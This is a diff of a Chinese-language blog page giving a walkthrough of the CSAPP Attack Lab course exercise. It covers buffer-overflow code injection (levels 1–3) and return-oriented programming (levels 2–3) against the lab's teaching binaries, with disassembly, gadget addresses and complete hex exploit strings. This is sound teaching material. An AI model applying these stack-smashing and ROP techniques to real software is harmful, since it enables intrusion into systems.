@@ -21,12 +21,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"destiny0118.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="Attack LabCSAPP:Attack lab - 简书 (jianshu.com) 代码注入攻击level 1反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。  test    getbuf    touch1  (gdb) disas touch1Dump of assembler code for function touch1:   0x0000">
+    <meta name="description" content="Attack Lab CSAPP:Attack lab - 简书 (jianshu.com) 代码注入攻击 level 1 反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。   test      getbuf      touch1   (gdb) disas touch1Dump of assembler code for function touch1:">
 <meta property="og:type" content="article">
 <meta property="og:title" content="我的个人博客">
 <meta property="og:url" content="https://destiny0118.github.io/2023/06/16/%E9%A1%B9%E7%9B%AE/CSAPP%20Attack%20Lab/index.html">
 <meta property="og:site_name" content="我的个人博客">
-<meta property="og:description" content="Attack LabCSAPP:Attack lab - 简书 (jianshu.com) 代码注入攻击level 1反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。  test    getbuf    touch1  (gdb) disas touch1Dump of assembler code for function touch1:   0x0000">
+<meta property="og:description" content="Attack Lab CSAPP:Attack lab - 简书 (jianshu.com) 代码注入攻击 level 1 反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。   test      getbuf      touch1   (gdb) disas touch1Dump of assembler code for function touch1:">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261040430.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261041743.png">
@@ -177,7 +177,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Attack-Lab"><span class="nav-text">Attack Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-text">代码注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1"><span class="nav-text">level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2"><span class="nav-text">level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-text">level3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E6%94%BB%E5%87%BB"><span class="nav-text">ROP攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3-1"><span class="nav-text">level3</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-text">Attack Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="nav-text">代码注入攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1"><span class="nav-text">level 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2"><span class="nav-text">level 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-text">level3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP%E6%94%BB%E5%87%BB"><span class="nav-text">ROP攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level2"><span class="nav-text">level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3-2"><span class="nav-text">level3</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -201,7 +201,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -302,30 +302,37 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h1><p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab - 简书 (jianshu.com)</a></p>
-<h2 id="代码注入攻击"><a href="#代码注入攻击" class="headerlink" title="代码注入攻击"></a>代码注入攻击</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。</p>
-<ul>
-<li>test</li>
+        <h1>Attack Lab</h1>
+<p><a href="https://www.jianshu.com/p/db731ca57342">CSAPP:Attack lab - 简书 (jianshu.com)</a></p>
+<h2 id="代码注入攻击">代码注入攻击</h2>
+<h3 id="level-1">level 1</h3>
+<p>反汇编test和getbuf函数，看到getbuf的栈空间大小为0x28，即40字节。</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>test</p>
+</li>
 </ul>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261040430.png" alt="image-20211126104027322"></p>
-<ul>
-<li>getbuf</li>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>getbuf</p>
+</li>
 </ul>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261041743.png" alt="image-20211126104154718"></p>
-<ul>
-<li>touch1</li>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>touch1</p>
+</li>
 </ul>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disas touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:		sub    $0x8,%rsp</span><br><span class="line">   0x00000000004017c4 &lt;+4&gt;:		movl   $0x1,0x202d0e(%rip)        # 0x6044dc &lt;vlevel&gt;</span><br><span class="line">   0x00000000004017ce &lt;+14&gt;:	mov    $0x4030c5,%edi</span><br><span class="line">   0x00000000004017d3 &lt;+19&gt;:	callq  0x400cc0 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004017d8 &lt;+24&gt;:	mov    $0x1,%edi</span><br><span class="line">   0x00000000004017dd &lt;+29&gt;:	callq  0x401c8d &lt;validate&gt;</span><br><span class="line">   0x00000000004017e2 &lt;+34&gt;:	mov    $0x0,%edi</span><br><span class="line">   0x00000000004017e7 &lt;+39&gt;:	callq  0x400e40 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
-
 <p>查看touch1的地址，用touch1的地址覆盖原来的返回地址</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">c0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
-
 <p>将每个字节的十六进制表示通过hex2raw转换为字符串，并将得到的字符串作为ctarget的输入。</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271848491.png" alt="image-20211127184819454"></p>
-<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>插入一段代码作为攻击字符串（exploit string）的一部分。</p>
+<h3 id="level-2">level 2</h3>
+<p>插入一段代码作为攻击字符串（exploit string）的一部分。</p>
 <p>设置断点，查看栈顶地址。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) break getbuf</span><br><span class="line">(gdb) run -q</span><br><span class="line">(gdb) disas</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">=&gt; 0x00000000004017a8 &lt;+0&gt;:	sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:	mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:	callq  0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:	mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:	add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:	retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) print /x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = 0x5561dca0</span></span><br><span class="line">(gdb) stepi</span><br><span class="line">14	in buf.c</span><br><span class="line">(gdb) print /x $rsp</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0x5561dc78</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111261054068.png" alt="image-20211126105412037"></p>
 <p>touch2需要接受一个参数，这个参数需要与cookie值相同，函数的第一个参数通过寄存器%rdi传递，同时设置完参数后需要将控制流转移到touch2，查看touch2的开始地址。</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271902954.png" alt="image-20211127190235909"></p>
@@ -333,18 +340,16 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq  $0x59b997fa, %rdi		</span><br><span class="line">pushq $0x4017ec                </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
 <p>对汇编代码汇编生成目标文件，对目标代码反汇编，得到指令序列的字节表示</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c level2.s</span><br><span class="line">objdump -d level2.o &gt; level2.d</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271908668.png" alt="image-20211127190828639"></p>
 <p>得到攻击字符串的字节序列：</p>
 <figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">48 </span>c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> <span class="number">68</span> ec <span class="number">17</span>     </span><br><span class="line"><span class="symbol">40 </span><span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">00 </span><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="symbol">78 </span>dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>			/* 栈顶地址<span class="number">0</span>x5561dc78 */</span><br></pre></td></tr></table></figure>
-
 <p>验证</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/hex2raw &lt; solution2.txt | ./</span>ctarget -q</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271911851.png" alt="image-20211127191142818"></p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>touch3函数接受一个指向字符数组首地址的指针作为参数</p>
+<h3 id="level3">level3</h3>
+<p>touch3函数接受一个指向字符数组首地址的指针作为参数</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111271958123.png" alt="image-20211127195837095"></p>
-<p>hexmatch接受cookie和字符数组作为参数，将cookie转化为字符串“59b997fa”，字符串的最后会有一个空字符&#x2F;0作为结束符，十六进制表示为00，strncmp函数比较了9个字符，因此在字符数组后面跟上结束符00</p>
+<p>hexmatch接受cookie和字符数组作为参数，将cookie转化为字符串“59b997fa”，字符串的最后会有一个空字符/0作为结束符，十六进制表示为00，strncmp函数比较了9个字符，因此在字符数组后面跟上结束符00</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272002553.png" alt="image-20211127200218526"></p>
 <p>查看getbuf，在函数返回前会修改栈顶的位置，释放占用的栈空间，而此时通过转移程序控制流执行touch3函数，调用hexmatch时会在栈上分配空间，因此touch3的参数指向的字符数组位置不能放在getbuf申请的占空间上。</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272003989.png" alt="image-20211126104154718"></p>
@@ -352,7 +357,6 @@
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272046849.png" alt="image-20211127204653792"></p>
 <p>getbuf栈空间应该执行的汇编代码：将字符数组的首地址通过%rdi寄存器传递给函数touch3，同时设置返回地址为touch3的首地址</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi     </span><br><span class="line">pushq $0x4018fa            </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
-
 <p>生成指令字节序列</p>
 <blockquote>
 <p>gcc -c level3.s     将汇编代码变成机器代码</p>
@@ -361,22 +365,24 @@
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272051563.png" alt="image-20211127205117537"></p>
 <p>对应攻击字符串的字节序列</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">48</span> c7 c7 a8 dc <span class="number">61</span> <span class="number">55</span> <span class="number">68</span> </span><br><span class="line"><span class="attribute">fa</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> c3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">78</span> dc <span class="number">61</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             </span><br><span class="line"><span class="attribute">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br><span class="line"><span class="attribute">00</span></span><br></pre></td></tr></table></figure>
-
 <p>验证</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/hex2raw &lt; solution3.txt | ./</span>ctarget -q</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111272054939.png" alt="image-20211127205424905"></p>
-<h2 id="ROP攻击"><a href="#ROP攻击" class="headerlink" title="ROP攻击"></a>ROP攻击</h2><p>在rtarget中，采用了两种方法来对抗栈溢出攻击：</p>
-<ul>
-<li><p>栈随机化</p>
+<h2 id="ROP攻击">ROP攻击</h2>
+<p>在rtarget中，采用了两种方法来对抗栈溢出攻击：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>栈随机化</p>
 <p>设置断点，运行两次查看%rsp栈顶的值，发现其值发生变化。这意味着无法知道getbuf申请栈空间后的栈顶值，从而无法将我们的可执行代码的字节序列以字符串的形式插入到相应的位置。</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281920181.png" alt="image-20211128192038064"></p>
 </li>
-<li><p>限制可执行代码区域，栈为不可执行区域</p>
+<li class="lvl-2">
+<p>限制可执行代码区域，栈为不可执行区域</p>
 </li>
 </ul>
 <p>rtarget中没有进行栈破坏检测，因此可以通过破话test的栈帧来达到幸运的目的。</p>
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>touch2接受一个参数，需要通过寄存器%rdi来传递，因此可以先把cookie值存放在栈中，通过popq指令获得这个值。</p>
+<h3 id="level2">level2</h3>
+<p>touch2接受一个参数，需要通过寄存器%rdi来传递，因此可以先把cookie值存放在栈中，通过popq指令获得这个值。</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281931624.png" alt="image-20211128193143591"></p>
 <p>根据提示，在start_farm和end_farm中查找满足要求的指令编码：</p>
 <p>指令编码需要满足一定要求，nop的指令编码为0x90，ret的指令编码为0xc3，我们通过popq指令或许栈顶的值后，不能有其他的无效指令或者别的指令对结果造成影响。</p>
@@ -386,14 +392,12 @@
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281946805.png" alt="image-20211128194608732"></p>
 <p>这一题只需要用到start_farm到mid_farm中的指令编码，通过查找，找到</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4019cc       58 		popq %rax</span><br><span class="line">               90		nop</span><br><span class="line">               c3		ret</span><br></pre></td></tr></table></figure>
-
 <p>这样的话，通过查看movq指令的编码，需要查找的指令编码为48 89 c7 (90) c3</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281950804.png" alt="image-20211128195027771"></p>
 <p>这里可以找到两个符合要求的结果：</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111281952447.png" alt="image-20211128195203377"></p>
 <p>使用的指令编码为</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x4019a2	48 89 c7	movq %rax, %rdi</span><br><span class="line">			c3			ret</span><br></pre></td></tr></table></figure>
-
 <p>因此栈可以组织如下：</p>
 <p>当getbuf函数返回时，返回地址为0x4019cc，同时栈顶为红色位置。</p>
 <p>在0x4019cc，执行popq %rax操作，此时栈顶指向的值为0x4019a2，执行ret指令，将这个值作为返回地址。</p>
@@ -401,9 +405,9 @@
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282010992.png" alt="image-20211128201044882"></p>
 <p>对应攻击字符串的字节序列：</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">cc</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           /* popq %rax */</span><br><span class="line"><span class="attribute">fa</span> <span class="number">97</span> b9 <span class="number">59</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           /* cookie    */</span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">ec</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282016927.png" alt="image-20211128201617892"></p>
-<h3 id="level3-1"><a href="#level3-1" class="headerlink" title="level3"></a>level3</h3><p>同代码注入攻击的level3，需要将cookie的字符串十六进制表示存储在某一位置，这一位置不能在getbuf栈帧中，因此需要在test栈帧中。其表示需要占用9个字节，可以考虑放在最近的位置，也就是返回地址的上面，返回地址是我们第一个可以操作的地方，这是要得到%rsp，即cookie字符串首地址的值。movq %rsp, D的指令编码为48 89 eX(X不确定)，查找：</p>
+<h3 id="level3-2">level3</h3>
+<p>同代码注入攻击的level3，需要将cookie的字符串十六进制表示存储在某一位置，这一位置不能在getbuf栈帧中，因此需要在test栈帧中。其表示需要占用9个字节，可以考虑放在最近的位置，也就是返回地址的上面，返回地址是我们第一个可以操作的地方，这是要得到%rsp，即cookie字符串首地址的值。movq %rsp, D的指令编码为48 89 eX(X不确定)，查找：</p>
 <p>可以查找到相关指令编码，这时栈顶指向字符串的首地址，而字符串占了两个8字节，后面需要跟两个pop指令让栈顶指向后面的位置，在后面的位置我们可以操作填上其他的地址，以供ret指令返回到相应的位置，但查找不到想应的指令序列。</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282027821.png" alt="image-20211128202754741"></p>
 <p>不能通过栈顶地址确定cookie字符串的地址，则cookie可以放在之后的位置，通过首地址+偏移量来确定其位置，但此时依旧需要先确定栈顶位置，并保存其值，因此先查找48 89 eX，看可以使用的指令编码：</p>
@@ -420,22 +424,23 @@
 <th>ret</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td>89 ( )</td>
 <td>(20、08、38、84)  (c0、c9、d2、db)</td>
 <td>c3</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <p>其中90也是不影响结果的，可以出现在相应中间位置。查找到的相关指令，可以看出可以实现%eax -&gt; %edx -&gt; %esi的传递。</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282043655.png" alt="image-20211128204306609"></p>
 <p>同时之前level2可以找到popq %rax指令，因此可以将偏移量存放在栈中，通过pop指令来进行传递给%esi。然后可以基址+偏移量来确定地址。</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282055203.png" alt="image-20211128205504176"></p>
 <p>现在还无法确定偏移量的值应该为多少，先通过之前的分析，确定程序的控制流：</p>
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282116865.png" alt="image-20211128211625690"></p>
-<p>可以确定偏移量为72&#x3D;0x48</p>
+<p>可以确定偏移量为72=0x48</p>
 <p>对应攻击字符串的字节序列：</p>
 <figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">06</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">ab</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">42</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">69</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">27</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">d6</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">a2</span> <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">fa</span> <span class="number">18</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">35</span> <span class="number">39</span> <span class="number">62</span> <span class="number">39</span> <span class="number">39</span> <span class="number">37</span> <span class="number">66</span> <span class="number">61</span></span><br><span class="line"><span class="attribute">00</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202111282118763.png" alt="image-20211128211834719"></p>
 
     </div>
